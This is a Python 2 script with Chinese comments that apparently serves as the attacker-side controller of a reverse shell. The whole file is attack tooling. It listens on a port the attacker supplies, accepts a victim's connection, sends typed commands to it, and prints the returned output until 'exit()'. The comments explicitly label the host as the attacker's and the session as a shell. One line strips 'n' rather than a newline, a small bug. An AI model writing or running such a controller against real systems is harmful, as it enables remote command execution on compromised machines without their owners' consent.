
# -*- coding: utf-8 -*-
import socket,subprocess as sp,sys                    # 导入subprocess，socket模块
 
# 1）监听信息
host = sys.argv[1]                                   # 攻击者地址，通常留空''
port = int(sys.argv[2])                              # 攻击者主机端口
 
# 2）套接字部分
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
s.bind((host,port))                                  # 绑定套接字
s.listen(100)                                        # 最大连接数:100
conn,addr  = s.accept()                              # 接收客户端连接
 
# 3）输出连接信息
print( "[+] Conection Established from: %s" % (str(addr[0])))
                                                     # 打印攻击者的连接信息
# 4）接收输出
while 1:                                            # 运行死循环初始化反向的连接
    command = raw_input("#> ")                      # 服务器输入
    # 5）if判断-1
    if command != "exit()":                         # 如果命令不是exit()，那就继续执行
        # 6）if判断-2
        if command == "": continue                  # 命令如果为空，循环这个函数
        # 7）发送、接收命令
        conn.send(command)                          # 发送命令到客户端
        result = conn.recv(1024)                    # 接收并输出
        # 8） 处理接收结果
        total_size = long(result[:16])              # 获取返回数据的大小,取出前16位的值
        result = result[16:]                        # 接收数据的结果，取16位之后的值
        # 9） 处理数据
        while total_size > len(result):             # 循环函数
            data = conn.recv(1024)                  # 每次接收1024的数据，如果发送的数据大于现在接收的数据
            result += data                          # 循环接收并且拼接起来
        # 10）打印结果过滤换行符
        print( result.rstrip("n"))                   # 过滤掉换行符
    else:
        conn.send("exit()")                         # 发送客户端关闭的消息
        print ("[+] shell Going Down")                # 本地退出提示
        break
# 11）出现任何故障关闭套接字
s.close()                                           # 关闭网络套接字